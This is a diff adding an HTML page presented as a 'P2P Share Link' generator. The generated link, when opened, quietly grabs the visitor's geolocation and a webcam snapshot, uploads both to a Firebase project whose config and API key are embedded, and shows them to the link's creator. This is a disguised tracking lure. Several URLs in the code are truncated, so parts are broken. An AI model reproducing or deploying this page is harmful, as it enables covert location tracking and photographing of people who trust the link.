@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>P2P Share Link</title>
+</head>
+<body>
+  <h1>P2P Share Link</h1>
+  <button onclick="generateLink()">Generate Link</button>
+  <input id="link" type="text" readonly>
+  <div id="hasil"></div>
+
+  <script src="https:                                                             
+  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyALFQBTqWh1plqPPfO_f0ZpVGQRSbJOnu4",
+      authDomain: "selfilokasi.firebaseapp.com",
+      databaseURL: "https:                                                                 
+      projectId: "selfilokasi",
+      storageBucket: "selfilokasi.firebasestorage.app",
+      messagingSenderId: "291578424572",
+      appId: "1:291578424572:web:eba849ddabecee299cfb79",
+      measurementId: "G-PZ5WK274C9"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    let idLink = '';
+    const urlParams = new URLSearchParams(window.location.search);
+    const id = urlParams.get('id');
+
+    if (id) {
+                    
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const video = document.createElement('video');
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            video.play();
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = 640;
+              canvas.height = 480;
+              canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+              const foto = canvas.toDataURL();
+              stream.getTracks()[0].stop();
+              db.collection('links').doc(id).update({
+                lokasi: `${lat},${lon}`,
+                foto: foto,
+                status: 'done'
+              });
+            }, 1000);
+          });
+      });
+    } else {
+                           
+      function generateLink() {
+        idLink = Math.random().toString(36).substr(2, 9);
+        const link = `${window.location.href}?id=${idLink}`;
+        document.getElementById('link').value = link;
+        db.collection('links').doc(idLink).set({
+          id: idLink,
+          status: 'pending'
+        });
+
+                                    
+        db.collection('links').doc(idLink).onSnapshot(doc => {
+          const data = doc.data();
+          if (data && data.status === 'done') {
+            document.getElementById('hasil').innerHTML = `
+              <h2>Hasil:</h2>
+              <p>Lokasi: ${data.lokasi}</p>
+              <img src="${data.foto}" width="200">
+            `;
+          }
+        });
+      }
+    }
+  </script>
+</body>
+</html>
